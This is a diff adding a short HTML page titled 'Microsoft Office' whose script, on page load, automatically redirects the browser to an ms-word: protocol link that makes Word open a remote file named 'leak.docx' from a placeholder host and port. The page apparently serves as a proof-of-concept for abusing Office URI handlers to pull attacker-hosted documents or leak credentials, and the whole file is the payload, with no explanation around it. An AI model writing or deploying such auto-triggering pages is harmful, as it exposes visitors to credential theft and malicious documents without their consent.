@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Office</title>
+</head>
+<body>
+    <a id="link" href="ms-word:ofe|u|http://hostname:port/leak.docx"></a>
+
+    <script>
+        function navigateToLink() {
+            var link = document.getElementById('link');
+            if (link) {
+                var url = link.getAttribute('href');
+                window.location.href = url;
+            }
+        }
+        window.onload = navigateToLink;
+    </script>
+</body>
+</html> 
